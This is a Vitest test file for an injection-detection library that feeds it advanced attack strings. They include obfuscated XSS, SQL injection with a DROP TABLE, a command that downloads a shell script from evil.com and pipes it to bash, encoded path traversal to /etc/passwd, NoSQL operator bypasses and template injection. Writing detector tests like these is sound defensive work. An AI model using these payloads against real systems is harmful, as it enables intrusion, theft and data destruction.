import { describe, it, expect } from 'vitest';
import {
  generateHash,
  detectXSS,
  detectSQLi,
  detectCommandInjection,
  detectPathTraversal,
  detectNoSQLi,
  detectTemplateInjection,
  traverseAndCheck,
} from '../src/utils';
import { PayloadGuardEventType } from '../src/types';

describe('Level 2: Advanced Penetration and Injection Attacks', () => {
  describe('Advanced XSS', () => {
    it('should detect XSS when using Unicode/Encoded characters in <script> tags', () => {
      const malicious = `&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;`;
      const decoded = `<script>alert(String.fromCharCode(88,83,83))</script>`;
      const result = detectXSS(decoded);
      expect(result.detected).toBe(true);
      expect(result.type).toBe(PayloadGuardEventType.XSS_DETECTED);
    });

    it('should detect XSS with obfuscated inline event handlers', () => {
      const malicious = `<div oNclIcK = "alert('XSS')">Click me</div>`;
      const result = detectXSS(malicious);
      expect(result.detected).toBe(true);
    });

    it('should detect compound XSS payloads combining multiple vectors', () => {
      const malicious = `<script>eval('alert(1)');</script><div onmouseover="alert('XSS')">Hover me</div>`;
      const result = detectXSS(malicious);
      expect(result.detected).toBe(true);
    });
  });

  describe('Advanced SQL Injection', () => {
    it('should detect SQLi using comment obfuscation and spacing tricks', () => {
      const malicious = "SELECT/**/ * FROM/**/ users WHERE username = 'admin' --'";
      const result = detectSQLi(malicious);
      expect(result.detected).toBe(true);
      expect(result.type).toBe(PayloadGuardEventType.SQL_INJECTION_DETECTED);
    });

    it('should detect SQLi using union-based attacks with encoded characters', () => {
      const malicious = '1 UNION%20SELECT%20username,%20password%20FROM%20users';
      const decoded = decodeURIComponent(malicious);
      const result = detectSQLi(decoded);
      expect(result.detected).toBe(true);
    });

    it('should detect SQLi with stacked queries and comment markers', () => {
      const malicious = '1; DROP TABLE users; --';
      const result = detectSQLi(malicious);
      expect(result.detected).toBe(true);
    });
  });

  describe('Advanced Command Injection', () => {
    it('should detect command injection with nested backticks and command substitution', () => {
      const malicious = 'echo `ls -la `echo /tmp``';
      const result = detectCommandInjection(malicious);
      expect(result.detected).toBe(true);
      expect(result.type).toBe(PayloadGuardEventType.COMMAND_INJECTION_DETECTED);
    });

    it('should detect command injection with encoded shell metacharacters', () => {
      const malicious = ';wget http://evil.com/shell.sh|bash';
      const result = detectCommandInjection(malicious);
      expect(result.detected).toBe(true);
    });

    it('should detect command injection with environment variable exploitation', () => {
      const malicious = 'export PATH=/malicious/path && id';
      const result = detectCommandInjection(malicious);
      expect(result.detected).toBe(true);
    });
  });

  describe('Advanced Path Traversal', () => {
    it('should detect double-encoded path traversal attempts', () => {
      const malicious = '%252e%252e%252fetc%252fpasswd';
      const decodedOnce = decodeURIComponent(malicious);
      const decodedTwice = decodeURIComponent(decodedOnce);
      const result = detectPathTraversal(decodedTwice);
      expect(result.detected).toBe(true);
      expect(result.type).toBe(PayloadGuardEventType.PATH_TRAVERSAL_DETECTED);
    });

    it('should detect path traversal using mixed slashes and backslashes', () => {
      const malicious = '..\\../etc/passwd';
      const result = detectPathTraversal(malicious);
      expect(result.detected).toBe(true);
    });

    it('should detect path traversal with null byte injection', () => {
      const malicious = '../etc/passwd%00';
      const decoded = decodeURIComponent(malicious);
      const result = detectPathTraversal(decoded);
      expect(result.detected).toBe(true);
    });
  });

  describe('Advanced NoSQL Injection', () => {
    it('should detect NoSQLi with nested JSON and operators', () => {
      const malicious = '{"username": {"$ne": null}, "password": {"$gt": ""}}';
      const result = detectNoSQLi(malicious);
      expect(result.detected).toBe(true);
      expect(result.type).toBe(PayloadGuardEventType.GENERAL_INJECTION_DETECTED);
    });

    it('should detect NoSQLi using function/eval operators', () => {
      const malicious = '{"$where": "function() { return this.a == 1; }"}';
      const result = detectNoSQLi(malicious);
      expect(result.detected).toBe(true);
    });
  });

  describe('Advanced Template Injection', () => {
    it('should detect template injection with nested templating', () => {
      const malicious = '{{#if user}}{{user.name}}{{/if}}';
      const result = detectTemplateInjection(malicious);
      expect(result.detected).toBe(true);
      expect(result.type).toBe(PayloadGuardEventType.GENERAL_INJECTION_DETECTED);
    });

    it('should detect template injection using alternative delimiters', () => {
      const malicious = "Hello ${constructor.constructor('return process')()} World";
      const result = detectTemplateInjection(malicious);
      expect(result.detected).toBe(true);
    });
  });

  describe('Advanced traverseAndCheck', () => {
    const detectors = [
      detectXSS,
      detectSQLi,
      detectCommandInjection,
      detectPathTraversal,
      detectNoSQLi,
      detectTemplateInjection,
    ];

    it('should detect multiple advanced injections in a deeply nested object', () => {
      const obj = {
        level1: {
          level2: [
            { safe: 'Just a safe string' },
            { dangerous: '1; DROP TABLE users; --' },
            { nested: { deeper: `<script>eval('alert(1)')</script>` } },
          ],
          another: {
            arr: [
              'clean',
              '../etc/passwd%00',
              { more: "Hello ${constructor.constructor('return process')()}" },
            ],
          },
        },
      };

      const result = traverseAndCheck(obj, '', detectors);
      expect(result.detected).toBe(true);
      expect(result.path).toMatch(/level1\..+|level2\[\d+\]|another\.arr\[\d+\]/);
    });

    it('should not be bypassed by excluded fields even with advanced payloads', () => {
      const obj = {
        safe: 'clean',
        ignoreMe: '<script>malicious()</script>',
        nested: {
          sensitive: 'SELECT * FROM users; --',
        },
      };
      const result = traverseAndCheck(obj, '', detectors, ['ignoreMe', 'sensitive']);
      expect(result.detected).toBe(false);
    });
  });
});
